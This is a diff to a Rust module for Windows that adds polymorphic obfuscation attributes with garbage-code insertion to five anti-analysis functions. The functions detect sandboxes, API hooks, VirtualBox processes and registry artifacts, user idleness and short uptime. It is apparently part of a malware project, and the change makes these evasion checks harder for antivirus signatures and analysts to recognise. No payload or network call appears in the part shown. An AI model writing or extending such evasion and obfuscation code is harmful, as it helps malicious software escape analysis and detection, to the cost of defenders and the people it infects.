@@ -1,4 +1,4 @@
-
+use rustpolymorphic::polymorph;
 use std::path::Path;
 use windows::{
     core::PCSTR,
@@ -19,6 +19,7 @@ use windows::{
 };
 
 /// Checks for user activity by querying the last input time.
+#[polymorph(fn_len = 10, garbage = true)]
 pub fn check_user_activity() -> bool {
     let mut last_input_info: LASTINPUTINFO = unsafe { std::mem::zeroed() };
     last_input_info.cbSize = std::mem::size_of::<LASTINPUTINFO>() as u32;
@@ -35,6 +36,7 @@ pub fn check_user_activity() -> bool {
 }
 
 /// Checks for common API hooking/sandboxing modules.
+#[polymorph(fn_len = 20, garbage = true)]
 pub fn check_for_hooking() -> bool {
     let mut modules = [HMODULE::default(); 1024];
     let mut needed = 0;
@@ -70,6 +72,7 @@ pub fn check_for_hooking() -> bool {
 }
 
 /// Checks for the presence of common analysis tools and sandbox-related processes.
+#[polymorph(fn_len = 30, garbage = true)]
 pub fn check_processes() -> bool {
     let suspicious_processes = [
         "vboxtray.exe",
@@ -114,6 +117,7 @@ pub fn check_processes() -> bool {
 }
 
 /// Checks for registry and file artifacts that indicate a sandbox environment.
+#[polymorph(fn_len = 15, garbage = true)]
 pub fn check_artifacts() -> bool {
     let suspicious_registry_keys = [
         "HARDWARE\\ACPI\\DSDT\\VBOX__",
@@ -143,6 +147,7 @@ pub fn check_artifacts() -> bool {
 }
 
 /// Checks the system uptime to detect freshly started sandboxes.
+#[polymorph(fn_len = 10, garbage = true)]
 pub fn check_uptime() -> bool {
     let uptime_ms = unsafe { GetTickCount64() };
     // If uptime is less than 5 minutes, it might be a sandbox.
